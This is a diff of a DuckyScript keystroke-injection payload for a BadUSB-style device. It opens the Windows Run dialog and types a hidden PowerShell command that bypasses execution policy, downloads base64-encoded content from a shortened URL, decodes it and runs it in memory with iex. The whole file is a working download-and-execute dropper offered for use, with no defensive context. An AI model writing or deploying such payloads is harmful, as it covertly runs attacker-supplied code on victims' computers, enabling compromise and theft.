@@ -1,3 +1,10 @@
 REM thank you to Redd for his assistance learning this skill.
 REM Memory execution 
-powershell -NoP -W H -Ep Bypass $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri "t.ly/Xe_Uf"))); iex $p
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -W H -Ep Bypass $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri "t.ly/Xe_Uf"))); iex $p
+DELAY 300
+ENTER
+
